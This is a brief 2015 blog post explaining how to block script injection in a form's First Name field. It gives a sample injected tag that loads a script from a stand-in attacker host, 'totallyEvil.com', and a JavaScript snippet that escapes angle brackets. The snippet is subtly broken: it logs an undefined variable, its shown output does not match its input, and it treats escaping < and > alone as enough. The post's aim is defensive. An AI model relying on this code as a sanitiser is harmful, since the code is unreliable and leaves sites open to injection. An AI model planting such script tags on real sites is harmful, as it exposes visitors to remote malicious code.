---
layout: post
title:  "Prohibit Injectable Scripts"
date:   2015-12-22 09:59:53 -0500
categories: javascript
---

If you’re capturing information in a form element, it’s a good idea to minimize the chances for someone to inject a malicious script into your site. Script injection is one of the methods used to hack a website. Let’s say someone tries to enter the following into your First Name input:

`<script src="http://totallyEvil.com/demonScript.js"></script>`

An easy thing to do is to convert the “<” and “>” characters into their html entities.

{% highlight javascript %}

var badScripty = '<script src="totallyEvil.com/demonScript.js"></script>';

var safeEntry = badScripty.replace(/</g, "&lt;");
safeEntry = safeEntry.replace(/>/g, "&gt;");

// check safescript
console.log(safeScript);

//returns
&lt;script src="totallyEvilScript.js"&gt;&lt;/script&gt;

{% endhighlight %}